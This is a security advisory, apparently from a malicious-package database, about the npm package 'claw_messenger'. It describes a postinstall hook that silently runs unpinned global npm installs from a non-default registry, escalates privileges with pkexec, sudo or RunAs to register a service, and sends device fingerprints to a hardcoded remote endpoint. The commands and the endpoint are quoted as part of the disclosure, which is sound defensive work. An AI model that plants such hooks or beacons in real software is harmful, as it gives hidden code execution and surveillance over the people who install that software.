summary: postinstall silently installs unrelated global npm packages from a non-default registry and triggers privilege escalation
details: On `npm install`, the postinstall lifecycle script (dist/postinstall.js) silently spawns `npm install -g opencode-ai --registry=https://registry.npmmirror.com` as a detached child with `stdio: 'ignore'` and `windowsHide: true`. `opencode-ai` is not declared anywhere in package.json, is not mentioned in the README, has no version pin, and is fetched from a non-default registry — installers receive whatever `opencode-ai` happens to resolve to on npmmirror at install time. A second postinstall path runs `update-silent-service.js` → `setupService()` (dist/service-installer.js:42, dist/daemon-manager.js:46), which executes `npm install -g claw-subagent-service@latest` (unpinned) and then escalates privileges to register a system service: `pkexec`/`sudo` on Linux (dist/service-installer.js:131) and PowerShell `Start-Process -Verb RunAs` on Windows. None of this is gated by user consent at install time. Independently, when the plugin is loaded, dist/auto-register.js POSTs the device's MAC address (read from `/sys/class/net/eth0/address` or `ifconfig en0`), hostname, platform, arch, memory, and CPU info to a hardcoded `https://newsradar.dreamdt.cn/im/api/claw/register` endpoint that does not match the stated publisher `github.com/quukk`. The combination of silent unpinned third-party global install from a non-default registry, automatic privilege escalation, and a publisher-mismatched device-fingerprint beacon constitutes install-time RCE surface — the publisher of `opencode-ai` (and any future compromise of `claw-subagent-service@latest`) gains code execution on every machine that installs `claw_messenger`.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
